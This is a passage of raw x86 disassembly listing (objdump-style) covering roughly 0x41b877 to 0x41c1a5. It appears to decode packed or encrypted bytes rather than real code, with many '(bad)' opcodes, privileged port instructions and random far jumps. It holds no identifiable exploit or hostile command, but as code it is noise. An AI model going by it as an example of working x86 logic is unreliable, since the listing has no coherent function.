  41b877:	loop   0x41b89b
  41b879:	fcom   QWORD PTR [ebx+0x525dc5c1]
  41b87f:	jae    0x41b8f0
  41b881:	xchg   edi,eax
  41b882:	into   
  41b883:	mov    bl,0xac
  41b885:	pop    eax
  41b886:	int3   
  41b887:	lea    ebp,[esi+0x12]
  41b88a:	repz add BYTE PTR [ebx+0x340d1845],dh
  41b891:	arpl   WORD PTR [ecx+0x59baf65f],si
  41b897:	mov    ch,0x54
  41b899:	dec    edi
  41b89a:	mov    cl,0xfe
  41b89c:	repnz pop esp
  41b89e:	xlat   BYTE PTR ds:[ebx]
  41b89f:	push   ecx
  41b8a0:	and    BYTE PTR [edx],0x3b
  41b8a3:	cmp    DWORD PTR [edx+0x31],edi
  41b8a6:	addr16 sbb al,0x9e
  41b8a9:	xor    edx,DWORD PTR [edi-0x7a]
  41b8ac:	mov    ds:0x1164ddf9,al
  41b8b1:	ret    
  41b8b2:	mov    ah,0x37
  41b8b4:	jne    0x41b874
  41b8b6:	sbb    cl,dl
  41b8b8:	gs jle 0x41b896
  41b8bb:	jle    0x41b883
  41b8bd:	nop
  41b8be:	jne    0x41b869
  41b8c0:	out    0x38,eax
  41b8c2:	jmp    0x9eaa:0x111f9fe3
  41b8c9:	aas    
  41b8ca:	in     al,0xdc
  41b8cc:	imul   si,WORD PTR [ebp-0x10bfc931],0xffdb
  41b8d4:	pop    esp
  41b8d5:	push   ebx
  41b8d6:	sti    
  41b8d7:	xchg   esi,eax
  41b8d8:	push   0xfffffff1
  41b8da:	inc    eax
  41b8db:	fsub   DWORD PTR [eax+0x2a590891]
  41b8e1:	in     al,dx
  41b8e2:	and    BYTE PTR [edi],0x83
  41b8e5:	pop    eax
  41b8e6:	mov    ebp,fs
  41b8e8:	sub    bl,BYTE PTR [eax-0x4ff4cdbf]
  41b8ee:	jae    0x41b899
  41b8f0:	mov    WORD PTR [ecx-0x7],ds
  41b8f3:	sahf   
  41b8f4:	jo     0x41b8b7
  41b8f6:	in     al,0x4c
  41b8f8:	jae    0x41b91e
  41b8fa:	test   dl,dl
  41b8fc:	int    0x7f
  41b8fe:	(bad)  
  41b8ff:	adc    eax,DWORD PTR [esi]
  41b901:	dec    esi
  41b902:	hlt    
  41b903:	add    eax,0x4cfbbafa
  41b909:	add    BYTE PTR [ecx],0x7a
  41b90c:	aaa    
  41b90d:	pop    es
  41b90e:	cld    
  41b90f:	mov    WORD PTR [edx+eiz*1+0x1691c8ef],?
  41b916:	mov    esi,0x18202c62
  41b91b:	jae    0x41b8b2
  41b91d:	hlt    
  41b91e:	repz mov ebp,0x4a2df7ef
  41b924:	mov    esi,0xc448dd0a
  41b929:	jmp    0x94f37ba8
  41b92e:	pop    ss
  41b92f:	inc    edx
  41b930:	es pop edx
  41b932:	dec    esp
  41b933:	pop    ebx
  41b934:	mov    ebp,0xa23eb748
  41b939:	retf   0x7b70
  41b93c:	mov    ecx,0xa2cca301
  41b941:	or     DWORD PTR [edi],edi
  41b943:	je     0x41b969
  41b945:	push   ebp
  41b946:	inc    ebx
  41b947:	call   0xe3bf983c
  41b94c:	out    0x1e,eax
  41b94e:	xchg   ecx,eax
  41b94f:	cmp    BYTE PTR [edi+0x989d22d],0xa4
  41b956:	xchg   DWORD PTR [ebp+0x69],edx
  41b959:	or     dl,BYTE PTR [edi+0x6b7b14a1]
  41b95f:	mov    esi,ebx
  41b961:	ja     0x41b90e
  41b963:	cmp    eax,0x4db97685
  41b968:	jl     0x41b937
  41b96a:	xchg   BYTE PTR [edx+ebx*4],dl
  41b96d:	jno    0x41b8fb
  41b96f:	gs pop bp
  41b972:	mov    dh,0xb7
  41b974:	call   0x5a0680c1
  41b979:	div    BYTE PTR [eax-0x6d]
  41b97c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b97d:	and    cl,BYTE PTR [edx-0x6640ea23]
  41b983:	mov    ss,WORD PTR [edx]
  41b985:	jo     0x41b9b4
  41b987:	int3   
  41b988:	inc    esp
  41b989:	pop    edi
  41b98a:	pushf  
  41b98b:	push   DWORD PTR [edx+0x14]
  41b98e:	into   
  41b98f:	xor    ah,BYTE PTR [ebp+ebp*1+0xc]
  41b993:	cwde   
  41b994:	retf   
  41b995:	inc    ebx
  41b996:	add    al,0xbe
  41b998:	jmp    0xb30b:0x6c604c17
  41b99f:	mov    WORD PTR [edi-0x6beea3ec],?
  41b9a5:	stc    
  41b9a6:	pop    esp
  41b9a7:	and    al,0xa8
  41b9a9:	inc    ecx
  41b9aa:	or     dh,dh
  41b9ac:	in     eax,0xc2
  41b9ae:	lds    ebp,FWORD PTR ds:0x53dccd5c
  41b9b4:	and    ecx,DWORD PTR [esi]
  41b9b6:	add    al,0xff
  41b9b8:	sbb    al,BYTE PTR [ecx+0x72]
  41b9bb:	cwde   
  41b9bc:	in     eax,0x3b
  41b9be:	pusha  
  41b9bf:	jp     0x41b9f1
  41b9c1:	(bad)  [eax+0x44eb83b4]
  41b9c7:	inc    edi
  41b9c8:	enter  0x30c5,0x14
  41b9cc:	dec    esp
  41b9cd:	inc    esp
  41b9ce:	pop    ebp
  41b9cf:	mov    ds:0xc7e815cf,al
  41b9d4:	stos   DWORD PTR es:[edi],eax
  41b9d5:	jp     0x41b9e0
  41b9d7:	jae    0x41ba41
  41b9d9:	mov    ah,0x7f
  41b9db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9dc:	or     esi,DWORD PTR [edx-0x7]
  41b9df:	xor    ebp,0x22
  41b9e2:	das    
  41b9e3:	jge    0x41b979
  41b9e5:	add    eax,0xb6d3985c
  41b9ea:	jmp    0x41ba25
  41b9ec:	(bad)  
  41b9ed:	icebp  
  41b9ee:	jne    0x41ba34
  41b9f0:	inc    edx
  41b9f1:	sbb    eax,0xf0ce37e4
  41b9f6:	or     edi,DWORD PTR [esi]
  41b9f8:	fdivr  QWORD PTR [esi]
  41b9fa:	dec    esi
  41b9fb:	mov    esp,es
  41b9fd:	or     esp,ebx
  41b9ff:	and    BYTE PTR [edx+ebp*2-0x51],0x95
  41ba04:	push   esp
  41ba05:	jae    0x41ba3c
  41ba07:	outs   dx,DWORD PTR ds:[esi]
  41ba08:	jb     0x41b999
  41ba0a:	mov    ebp,0xbf93ebcd
  41ba0f:	into   
  41ba10:	fucom  st(0)
  41ba12:	test   BYTE PTR [ebp-0x46],ah
  41ba15:	xchg   ebx,eax
  41ba16:	xor    eax,0xba4b80d4
  41ba1b:	jmp    ebx
  41ba1d:	xor    ebx,DWORD PTR [edx+0x75c4859]
  41ba23:	inc    edx
  41ba24:	js     0x41b9df
  41ba26:	xlat   BYTE PTR ds:[ebx]
  41ba27:	les    ebx,FWORD PTR [edi-0x2f5a6606]
  41ba2d:	(bad)  
  41ba2e:	aam    0xcc
  41ba30:	mov    eax,0x88466d0a
  41ba35:	rcl    DWORD PTR [ecx*4-0x6b7ccb70],1
  41ba3c:	test   DWORD PTR cs:[ecx-0x1e],0x122d57a6
  41ba44:	cld    
  41ba45:	mov    ebp,0xcdb177f2
  41ba4a:	inc    eax
  41ba4b:	bt     esi,ecx
  41ba4e:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba50:	xchg   edi,eax
  41ba51:	ins    DWORD PTR es:[edi],dx
  41ba52:	ins    DWORD PTR es:[edi],dx
  41ba53:	test   ch,dh
  41ba55:	ret    
  41ba56:	adc    al,0x73
  41ba58:	pop    edx
  41ba59:	aas    
  41ba5a:	jp     0x41ba68
  41ba5c:	loop   0x41ba67
  41ba5e:	bound  ebp,QWORD PTR [ebx+0x17d0957b]
  41ba64:	jns    0x41ba66
  41ba66:	lahf   
  41ba67:	pusha  
  41ba68:	cld    
  41ba69:	aaa    
  41ba6a:	imul   ebx,DWORD PTR [ecx+0xedf878b],0xe4b3cd51
  41ba74:	cli    
  41ba75:	neg    DWORD PTR [ebp+0x46]
  41ba78:	not    bh
  41ba7a:	or     esp,ebx
  41ba7c:	mov    edx,0xb99fb18f
  41ba81:	in     eax,dx
  41ba82:	clc    
  41ba83:	pusha  
  41ba84:	retf   0x3a2c
  41ba87:	mov    esp,0xbfe6709a
  41ba8c:	jb     0x41ba55
  41ba8e:	ds mov esp,0x3ed7f1a6
  41ba94:	mov    eax,0xb3a581b2
  41ba99:	pop    edx
  41ba9a:	cmp    eax,DWORD PTR [edx+0x2631df0b]
  41baa0:	iret   
  41baa1:	inc    edx
  41baa2:	and    ah,BYTE PTR ds:[ebx+0x37]
  41baa6:	xchg   esi,eax
  41baa7:	push   es
  41baa8:	jnp    0x41bb11
  41baaa:	mov    eax,ds:0x64092e71
  41baaf:	fdiv   st,st(0)
  41bab1:	mov    ebp,0x1e66fe48
  41bab6:	jae    0x41bb34
  41bab8:	fnstcw WORD PTR cs:[eax]
  41babb:	push   edi
  41babc:	add    DWORD PTR [ebx-0x40749dde],edx
  41bac2:	das    
  41bac3:	in     eax,dx
  41bac4:	lock rcr ah,cl
  41bac7:	lea    esp,es:[ebx]
  41baca:	cmp    DWORD PTR [ebp+0x4973288],esp
  41bad0:	or     cl,ch
  41bad2:	sub    eax,0x67cf2b57
  41bad7:	pusha  
  41bad8:	xchg   edx,eax
  41bad9:	aas    
  41bada:	jb     0x41bb32
  41badc:	inc    edi
  41badd:	cld    
  41bade:	das    
  41badf:	fdivr  st,st(6)
  41bae1:	pop    ebp
  41bae2:	inc    ecx
  41bae3:	fwait
  41bae4:	sub    esp,ecx
  41bae6:	popf   
  41bae7:	arpl   WORD PTR ss:[ecx],si
  41baea:	pop    esi
  41baeb:	mov    esi,0xb0b99f94
  41baf0:	fwait
  41baf1:	fs push ebp
  41baf3:	pop    es
  41baf4:	popf   
  41baf5:	sub    ch,BYTE PTR [eax]
  41baf7:	cmp    eax,0xe42029a1
  41bafc:	(bad)  
  41bafd:	rcr    DWORD PTR [ecx],1
  41baff:	aad    0xbc
  41bb01:	repnz in al,dx
  41bb03:	loope  0x41bb31
  41bb05:	test   eax,0x2ee38a1c
  41bb0a:	daa    
  41bb0b:	or     DWORD PTR [esi],edi
  41bb0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0e:	push   ss
  41bb0f:	xor    edx,ebx
  41bb11:	dec    edi
  41bb12:	in     al,dx
  41bb13:	je     0x41baac
  41bb15:	sub    al,0x2c
  41bb17:	outs   dx,DWORD PTR ds:[esi]
  41bb18:	dec    DWORD PTR ds:0x11474f77
  41bb1e:	mov    cl,0x1d
  41bb20:	xchg   al,al
  41bb22:	jl     0x41baef
  41bb24:	inc    esi
  41bb25:	arpl   WORD PTR [ecx-0x2e],sp
  41bb28:	rcl    dl,cl
  41bb2a:	(bad)  
  41bb2b:	mov    esi,0xa6ae8b32
  41bb30:	xor    ebp,DWORD PTR [esi+esi*1-0x6c77f211]
  41bb37:	adc    al,0x2d
  41bb39:	xor    ch,bh
  41bb3b:	sbb    edi,esp
  41bb3d:	mov    dl,0xeb
  41bb3f:	sbb    eax,0x1c100d3a
  41bb44:	pop    eax
  41bb45:	push   es
  41bb46:	fld    TBYTE PTR [edx]
  41bb48:	xor    eax,0x59133b46
  41bb4d:	mov    edx,0x89ace9da
  41bb52:	mov    ah,0x7d
  41bb54:	daa    
  41bb55:	ret    
  41bb56:	shr    DWORD PTR [edi-0x527fd6c],1
  41bb5c:	dec    eax
  41bb5d:	jb     0x41bb13
  41bb5f:	bound  eax,QWORD PTR [edx-0x55]
  41bb62:	outs   dx,DWORD PTR ds:[esi]
  41bb63:	fbld   TBYTE PTR [eax-0x2de71362]
  41bb69:	push   esp
  41bb6a:	repz aam 0xff
  41bb6d:	sub    BYTE PTR [ebp-0x47],0x77
  41bb71:	pusha  
  41bb72:	jns    0x41bbc5
  41bb74:	jno    0x41bbea
  41bb76:	pop    ss
  41bb77:	cmp    eax,0x881fd86
  41bb7c:	dec    ebp
  41bb7d:	add    BYTE PTR [esi-0x757f36d3],bh
  41bb83:	mov    dl,0x5
  41bb85:	adc    al,0xe4
  41bb87:	xor    DWORD PTR [ecx],ebx
  41bb89:	mov    eax,0xa55fa589
  41bb8e:	jnp    0x41bb37
  41bb90:	jmp    0x76f0:0xa77d79b8
  41bb97:	sahf   
  41bb98:	jb     0x41bc14
  41bb9a:	lods   al,BYTE PTR ds:[esi]
  41bb9b:	ja     0x41bc0b
  41bb9d:	dec    ebx
  41bb9e:	(bad)  
  41bb9f:	mov    esp,0x79368f7b
  41bba4:	xchg   ecx,eax
  41bba5:	ret    
  41bba6:	cmp    al,BYTE PTR [edx-0x2c]
  41bba9:	xchg   edx,eax
  41bbaa:	xchg   edi,eax
  41bbab:	or     eax,0xab444b1
  41bbb0:	ret    0xb173
  41bbb3:	sar    bl,1
  41bbb5:	jne    0x41bb6e
  41bbb7:	mov    ecx,DWORD PTR [ecx-0x62]
  41bbba:	ss push ds
  41bbbc:	or     al,0x12
  41bbbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbbf:	rdtsc  
  41bbc1:	sbb    esi,DWORD PTR [edx-0x3fec6ee9]
  41bbc7:	in     al,dx
  41bbc8:	mov    ah,0x91
  41bbca:	test   DWORD PTR [ebx],esi
  41bbcc:	repnz pop ebx
  41bbce:	(bad)  
  41bbcf:	sub    al,ch
  41bbd1:	push   cs
  41bbd2:	and    BYTE PTR [ebp+edi*2-0x43],bl
  41bbd6:	icebp  
  41bbd7:	and    BYTE PTR [ecx*8-0x573ee879],bl
  41bbde:	lods   eax,DWORD PTR ds:[esi]
  41bbdf:	jns    0x41bc1b
  41bbe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bbe2:	add    BYTE PTR [ebx],dh
  41bbe4:	and    eax,0xa63e22a5
  41bbe9:	mov    BYTE PTR [edx],cl
  41bbeb:	call   0x6b0c9a55
  41bbf0:	and    BYTE PTR [ebx-0x39d45890],dl
  41bbf6:	pop    edx
  41bbf7:	push   ebp
  41bbf8:	xor    ebx,DWORD PTR [ebp-0x7026f11e]
  41bbfe:	js     0x41bb91
  41bc00:	jae    0x41bc67
  41bc02:	outs   dx,BYTE PTR ds:[esi]
  41bc03:	cwde   
  41bc04:	inc    esp
  41bc05:	lods   eax,DWORD PTR ds:[esi]
  41bc06:	fimul  DWORD PTR cs:[ebp+0x2c9e3ef6]
  41bc0d:	cld    
  41bc0e:	cmp    BYTE PTR [ebp-0x3bb46d75],bh
  41bc14:	xor    eax,edx
  41bc16:	int    0x62
  41bc18:	mov    ch,0x36
  41bc1a:	popf   
  41bc1b:	push   edx
  41bc1c:	sub    dh,BYTE PTR [ecx-0x75]
  41bc1f:	cmp    ebp,DWORD PTR [ebx+esi*2+0x38]
  41bc23:	jmp    0x92499670
  41bc28:	dec    ecx
  41bc29:	mov    esp,0x476ec75c
  41bc2e:	adc    al,0xfd
  41bc30:	and    DWORD PTR [ecx],edx
  41bc32:	and    edx,DWORD PTR [ebx+0x6bfefb]
  41bc38:	and    bl,BYTE PTR [esi-0x26]
  41bc3b:	mov    eax,ds:0x7fc1d7ea
  41bc40:	mov    ecx,0xcf2a0d05
  41bc45:	aad    0x66
  41bc47:	push   0x6d421b7c
  41bc4c:	retf   
  41bc4d:	addr16 pop es
  41bc4f:	imul   DWORD PTR [esi+0x3434779d]
  41bc55:	and    bl,ch
  41bc57:	in     al,0xad
  41bc59:	fxch   st(1)
  41bc5b:	ja     0x41bcbb
  41bc5d:	push   es
  41bc5e:	add    DWORD PTR [edx+0x19],ebx
  41bc61:	(bad)  
  41bc62:	push   ds
  41bc63:	pop    edx
  41bc64:	dec    eax
  41bc65:	adc    al,0xaf
  41bc67:	mov    dl,0x2f
  41bc69:	mov    eax,0xcf79b0a4
  41bc6e:	jae    0x41bcca
  41bc70:	ror    edi,0xb7
  41bc73:	push   eax
  41bc74:	rol    BYTE PTR [ecx+0x231b182c],1
  41bc7a:	int3   
  41bc7b:	and    ch,ch
  41bc7d:	es int 0xfa
  41bc80:	xchg   DWORD PTR [eax+0x5],eax
  41bc83:	stos   BYTE PTR es:[edi],al
  41bc84:	adc    bl,dl
  41bc86:	pop    esp
  41bc87:	scas   eax,DWORD PTR es:[edi]
  41bc88:	inc    ecx
  41bc89:	and    BYTE PTR [ecx+edx*1+0x410a8d6c],0x89
  41bc91:	rol    BYTE PTR [edx-0x3],0xa9
  41bc95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc96:	push   eax
  41bc97:	mov    eax,ds:0xfae31f97
  41bc9c:	lock nop
  41bc9e:	nop
  41bc9f:	or     eax,0x86a1bb8
  41bca4:	lds    eax,FWORD PTR [eax+0x31]
  41bca7:	cmp    ebx,DWORD PTR es:[edi-0x51]
  41bcab:	stos   DWORD PTR es:[edi],eax
  41bcac:	dec    DWORD PTR [edi+0x58a48baa]
  41bcb2:	in     eax,0xc2
  41bcb4:	in     al,dx
  41bcb5:	dec    esp
  41bcb6:	push   edx
  41bcb7:	push   ebx
  41bcb8:	mov    al,0x9b
  41bcba:	sbb    al,0x15
  41bcbc:	xor    DWORD PTR [ebp+ebx*8+0x5],ecx
  41bcc0:	sbb    ebx,edx
  41bcc2:	ret    
  41bcc3:	stos   BYTE PTR es:[edi],al
  41bcc4:	ret    
  41bcc5:	lea    edi,[edi-0x24]
  41bcc8:	add    al,0x4a
  41bcca:	loop   0x41bc80
  41bccc:	inc    edi
  41bccd:	mov    ah,bh
  41bccf:	(bad)  
  41bcd0:	fcom   DWORD PTR [edx-0x44b43b53]
  41bcd6:	call   0x6c57d394
  41bcdb:	jbe    0x41bcdd
  41bcdd:	popa   
  41bcde:	rep lods eax,DWORD PTR ds:[esi]
  41bce0:	xchg   esi,eax
  41bce1:	push   cs
  41bce2:	mov    WORD PTR [edx],cs
  41bce4:	jb     0x41bc66
  41bce6:	jb     0x41bcb8
  41bce8:	enter  0x1824,0x7d
  41bcec:	sub    eax,0x8ff40b03
  41bcf1:	and    BYTE PTR [edi-0xcc7c0fe],dl
  41bcf7:	popf   
  41bcf8:	mov    ds:0xbe7df5fd,al
  41bcfd:	xchg   ebx,eax
  41bcfe:	lea    ebp,ds:0x6f642652
  41bd04:	cli    
  41bd05:	call   0xfd6fce5
  41bd0a:	mov    ah,0x34
  41bd0c:	pusha  
  41bd0d:	sbb    al,0x3a
  41bd0f:	xchg   ebx,eax
  41bd10:	cs ds sub al,0x4f
  41bd14:	mov    esi,0xe1874351
  41bd19:	fdiv   DWORD PTR [esi-0x351f2f6d]
  41bd1f:	xchg   edi,eax
  41bd20:	add    BYTE PTR [esi-0x7f],dh
  41bd23:	leave  
  41bd24:	mov    dh,0x9
  41bd26:	in     al,dx
  41bd27:	push   cs
  41bd28:	and    al,0xfc
  41bd2a:	sbb    bl,bl
  41bd2c:	mov    al,ds:0xe3523b64
  41bd31:	pop    ebx
  41bd32:	fdivr  QWORD PTR [ebp-0x2354000d]
  41bd38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd39:	cmp    al,0xd
  41bd3b:	jne    0x41bd67
  41bd3d:	clc    
  41bd3e:	pushw  0x36f6
  41bd42:	mov    ch,0xb1
  41bd44:	pop    edi
  41bd45:	clc    
  41bd46:	dec    ebp
  41bd47:	or     DWORD PTR [eax],ecx
  41bd49:	sub    DWORD PTR [ebx],esp
  41bd4b:	sahf   
  41bd4c:	out    dx,al
  41bd4d:	and    al,BYTE PTR [eax]
	...
  41bf1b:	add    BYTE PTR [eax],al
  41bf1d:	add    BYTE PTR [edi-0x73],dl
  41bf20:	popa   
  41bf21:	jle    0x41bf1e
  41bf23:	(bad)  
  41bf24:	pop    edi
  41bf25:	lods   eax,DWORD PTR ds:[esi]
  41bf26:	into   
  41bf27:	fisttp DWORD PTR [edx+0x58]
  41bf2a:	add    BYTE PTR [esi],bl
  41bf2c:	xor    cl,dh
  41bf2e:	imul   DWORD PTR [edi]
  41bf30:	add    DWORD PTR [eax],eax
  41bf32:	and    al,BYTE PTR [edi]
  41bf34:	add    BYTE PTR [eax],al
  41bf36:	sbb    eax,0xe946f9bf
  41bf3b:	popa   
  41bf3c:	jae    0x41bf82
  41bf3e:	cmp    ecx,DWORD PTR [ebp+0x7c]
  41bf41:	out    dx,al
  41bf42:	dec    edx
  41bf43:	mov    dl,0x7
  41bf45:	mov    esi,0xf8d8b923
  41bf4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf4b:	popa   
  41bf4c:	xor    ecx,ebp
  41bf4e:	or     BYTE PTR [esi],al
  41bf50:	leave  
  41bf51:	sbb    BYTE PTR [esi+edx*1+0x6ca1274b],ah
  41bf58:	cmp    eax,0x8c403c02
  41bf5d:	lds    edx,FWORD PTR [ebx]
  41bf5f:	repnz cwde 
  41bf61:	arpl   WORD PTR [edx+0x75],dx
  41bf64:	aad    0x1e
  41bf66:	sub    al,0x67
  41bf69:	mov    edi,0xd458cda2
  41bf6e:	sub    esp,DWORD PTR [esi]
  41bf70:	push   0x3e
  41bf72:	dec    esp
  41bf73:	daa    
  41bf74:	pop    ecx
  41bf75:	int    0x81
  41bf77:	call   0xf3f4ff97
  41bf7c:	jl     0x41bf27
  41bf7e:	inc    ebx
  41bf7f:	ss ss ss (bad) 
  41bf83:	repnz stc 
  41bf85:	mov    ds:0xf857f71,eax
  41bf8a:	out    0x15,al
  41bf8c:	sbb    edx,DWORD PTR [ebx]
  41bf8e:	cmc    
  41bf8f:	int    0x2a
  41bf91:	stc    
  41bf92:	ja     0x41bfe6
  41bf94:	in     eax,0x4b
  41bf96:	pusha  
  41bf97:	cmp    DWORD PTR [eax-0x76],esp
  41bf9a:	push   edx
  41bf9b:	clc    
  41bf9c:	pop    ss
  41bf9d:	cmp    ah,BYTE PTR [ecx]
  41bf9f:	stc    
  41bfa0:	sub    BYTE PTR [edi+esi*8+0x52],ch
  41bfa4:	aam    0x4d
  41bfa6:	inc    BYTE PTR [ebp-0x4f]
  41bfa9:	(bad)  
  41bfab:	out    dx,al
  41bfac:	lock jae 0x41bf97
  41bfaf:	stc    
  41bfb0:	adc    eax,0x8fc06918
  41bfb5:	ins    DWORD PTR es:[edi],dx
  41bfb6:	sub    DWORD PTR [ecx+0x6f],ebx
  41bfb9:	inc    ebx
  41bfba:	cmp    eax,ecx
  41bfbc:	sahf   
  41bfbd:	aas    
  41bfbe:	mov    cl,0x2c
  41bfc0:	sbb    eax,0x11673a6f
  41bfc5:	and    edi,DWORD PTR [edi]
  41bfc7:	ins    BYTE PTR es:[edi],dx
  41bfc8:	inc    edi
  41bfc9:	jno    0x41bf8c
  41bfcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfcc:	mov    ebp,0x6939281b
  41bfd1:	out    0x68,al
  41bfd3:	test   al,0x98
  41bfd5:	call   0x3e4d6b9b
  41bfda:	pop    es
  41bfdb:	fwait
  41bfdc:	xchg   DWORD PTR [ebp-0x7eef9775],esi
  41bfe2:	aad    0x39
  41bfe4:	dec    ebx
  41bfe5:	mov    ebp,0x132a9522
  41bfea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfeb:	add    BYTE PTR [esi],dl
  41bfed:	shl    DWORD PTR [ebp-0x5],cl
  41bff0:	sub    eax,0x8d08e83
  41bff5:	into   
  41bff6:	je     0x41c073
  41bff8:	es pushf 
  41bffa:	js     0x41c045
  41bffc:	jmp    0x41c01d
  41bffe:	loop   0x41bfed
  41c000:	test   eax,0x374db75c
  41c005:	xchg   esi,eax
  41c006:	(bad)  
  41c007:	(bad)  
  41c009:	imul   esp,eax,0x81dfe10a
  41c00f:	or     BYTE PTR [ebx],ah
  41c011:	mov    BYTE PTR [edx-0x78],al
  41c014:	imul   edx,DWORD PTR [eax-0x32],0x318c72b2
  41c01b:	xor    ah,dh
  41c01d:	cmp    cl,BYTE PTR [ebp+0x1b]
  41c020:	push   edx
  41c021:	cmp    ecx,0x4b3ec7df
  41c027:	loopne 0x41c016
  41c029:	xchg   edx,eax
  41c02a:	(bad)  
  41c02b:	cmp    BYTE PTR [eax+0x2e],dl
  41c02e:	xor    DWORD PTR [esi-0x76467c98],0x72
  41c035:	sub    esp,ecx
  41c037:	mov    ds:0x7280251d,al
  41c03c:	sub    BYTE PTR [edx-0x6640889e],0xad
  41c043:	adc    al,0xa3
  41c045:	test   BYTE PTR [eax],cl
  41c047:	jno    0x41c005
  41c049:	(bad)  
  41c04a:	repnz in al,0x25
  41c04d:	jno    0x41c02e
  41c04f:	bound  eax,QWORD PTR [edi-0x1e7b12b9]
  41c055:	sbb    DWORD PTR [edi-0x3c],eax
  41c058:	mov    bh,BYTE PTR [ebx+0x693c9d3a]
  41c05e:	(bad)  
  41c05f:	idiv   BYTE PTR [esp+ebp*1-0x228f108b]
  41c066:	jp     0x41c07a
  41c068:	loope  0x41c046
  41c06a:	sbb    DWORD PTR [eax+0x1c9cf75],ecx
  41c070:	test   al,0xda
  41c072:	and    DWORD PTR [ecx],eax
  41c074:	pop    edi
  41c075:	adc    al,0xb3
  41c077:	mov    BYTE PTR [esi],dl
  41c079:	sub    al,0x7d
  41c07b:	jecxz  0x41c0cf
  41c07d:	and    eax,0x5aae7cc1
  41c082:	call   0x5a00:0x4395bdae
  41c089:	pop    ebx
  41c08a:	xchg   esi,eax
  41c08b:	xchg   esi,eax
  41c08c:	das    
  41c08d:	pop    eax
  41c08e:	loope  0x41c0cb
  41c090:	test   al,0xf3
  41c092:	dec    edi
  41c093:	fisubr WORD PTR [esi+0x7231cbf3]
  41c09a:	cmc    
  41c09b:	dec    ebx
  41c09c:	jbe    0x41c052
  41c09e:	jnp    0x41c0f0
  41c0a0:	add    cl,BYTE PTR [eax+0xb66a64d]
  41c0a6:	mov    ecx,0x707b84d5
  41c0ab:	ja     0x41c0c3
  41c0ad:	pop    esp
  41c0ae:	arpl   WORD PTR [ebx],bp
  41c0b0:	loope  0x41c09a
  41c0b2:	jmp    0xa502:0x235cc5a4
  41c0b9:	hlt    
  41c0ba:	jbe    0x41c0b8
  41c0bc:	pop    esi
  41c0bd:	sti    
  41c0be:	inc    edi
  41c0bf:	cli    
  41c0c0:	iret   
  41c0c1:	or     DWORD PTR [ebx],ecx
  41c0c3:	sub    BYTE PTR [edi],0x98
  41c0c6:	cmp    bl,BYTE PTR [esi-0x72e37a7]
  41c0cc:	mov    dl,0x56
  41c0ce:	js     0x41c0ce
  41c0d0:	mov    cl,BYTE PTR [esi+ebp*1-0xd]
  41c0d4:	sub    ah,bl
  41c0d6:	jno    0x41c07e
  41c0d8:	mov    bh,0x15
  41c0da:	rcl    BYTE PTR [ebp+0x4995fca7],cl
  41c0e0:	sub    ebp,DWORD PTR [ecx+ebp*4-0x72253f97]
  41c0e7:	sub    DWORD PTR [edx],esp
  41c0e9:	test   BYTE PTR [edx+0xf],0xf9
  41c0ed:	mov    esi,gs
  41c0ef:	mov    ah,al
  41c0f1:	sbb    BYTE PTR [eax+0x51],bh
  41c0f4:	push   edi
  41c0f5:	das    
  41c0f6:	mov    DWORD PTR cs:[edx+0x19],edx
  41c0fa:	mov    bl,0x9
  41c0fc:	pop    esi
  41c0fd:	xchg   esp,eax
  41c0fe:	jno    0x41c161
  41c100:	pop    ebp
  41c101:	inc    esi
  41c102:	or     al,0xb1
  41c104:	mov    ebp,0x36b4b036
  41c109:	jmp    0x4df2:0xff4da032
  41c110:	inc    eax
  41c111:	in     al,0x35
  41c113:	pop    esp
  41c114:	cwde   
  41c115:	data16 test dh,0xb8
  41c119:	leave  
  41c11a:	repz int3 
  41c11c:	retf   0x554c
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	jbe    0x41c10e
  41c122:	dec    ebp
  41c123:	cmc    
  41c124:	adc    dh,BYTE PTR [esi]
  41c126:	imul   edx,ebx,0x65ccf68b
  41c12c:	(bad)  
  41c12d:	jg     0x41c10e
  41c12f:	cdq    
  41c130:	(bad)  
  41c131:	ins    BYTE PTR es:[edi],dx
  41c132:	pop    es
  41c133:	stc    
  41c134:	adc    bh,BYTE PTR [ebx]
  41c136:	fcmovu st,st(3)
  41c138:	mov    ch,0x5a
  41c13a:	cmc    
  41c13b:	fdiv   QWORD PTR [ebx]
  41c13d:	ret    0x6513
  41c140:	inc    edx
  41c141:	pusha  
  41c142:	dec    ebp
  41c143:	mov    ds:0x22821365,eax
  41c148:	bound  edi,QWORD PTR [esi]
  41c14a:	xchg   esp,eax
  41c14b:	inc    eax
  41c14c:	xchg   edi,eax
  41c14d:	mov    ds:0x64600bfb,al
  41c152:	pop    edx
  41c153:	(bad)  
  41c154:	int3   
  41c155:	mov    ebp,0x90f44ae0
  41c15a:	pop    es
  41c15b:	repnz shr DWORD PTR [edi],0x41
  41c15f:	call   0xa66f:0x6801c86b
  41c166:	in     eax,dx
  41c167:	inc    ecx
  41c168:	jg     0x41c120
  41c16a:	mov    ch,BYTE PTR [edi]
  41c16c:	ins    BYTE PTR es:[edi],dx
  41c16d:	(bad)  
  41c16f:	call   0x9e71:0xefc5bf84
  41c176:	and    ebx,DWORD PTR [edx+0x2e]
  41c179:	xor    dh,ch
  41c17b:	or     al,0x4b
  41c17d:	aas    
  41c17e:	pop    ebx
  41c17f:	pop    edx
  41c180:	fidiv  WORD PTR [edi]
  41c182:	clc    
  41c183:	fwait
  41c184:	call   0x62a0:0xbd2adcce
  41c18b:	cmp    DWORD PTR [ebx],ecx
  41c18d:	(bad)  
  41c18f:	xor    BYTE PTR [eax+ebp*8],0xea
  41c193:	push   ecx
  41c194:	and    al,0x54
  41c196:	jbe    0x41c199
  41c198:	cmc    
  41c199:	ret    0xc1a8
  41c19c:	out    dx,al
  41c19d:	pop    ds
  41c19e:	pop    ebx
  41c19f:	and    ebx,DWORD PTR ds:0xb4ef701e
  41c1a5:	test   DWORD PTR [ebx-0x78],ecx
